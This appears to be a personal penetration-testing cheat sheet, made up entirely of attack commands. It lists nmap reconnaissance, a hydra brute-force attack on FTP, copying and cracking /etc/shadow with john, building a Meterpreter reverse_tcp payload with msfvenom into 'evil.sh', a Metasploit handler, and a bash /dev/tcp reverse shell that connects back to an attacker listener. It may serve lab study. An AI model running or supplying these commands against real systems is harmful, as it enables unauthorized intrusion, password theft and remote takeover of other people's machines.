## Search Host
  sudo nmap -sP 192.168.1.0/24

### Search open Port
  sudo nmap -sV -O -p- <IP>

### confirm service name
  sudo nmap -p<port> <IP>

### connect nc
  sudo nc -nv <IP> <port>

### list attack
  sudo hydra -L user.lst -P pass.lst -t 4 <IP> ftp

### analyze password
  sudo cp /etc/shadow <passowordsfile>
  sudo john --incremental <passwordsfile>
  
## msfconsole

sudo msfconsole
msf > show exploits
msf > search type:payload reverse_tcp platform:linux

### create payload

msf > msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.100.2 -f sh -o /home/tochibow9/evil.sh

### reverse shell

msf > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.100.2
msf6 exploit(multi/handler) > show options
msf6 exploit(multi/handler) > exploit 

### reverse shell for standard

attacker> nc -nvlp 5555
victim> bash -i >& /dev/tcp/<attackerIP>/5555 0>&1

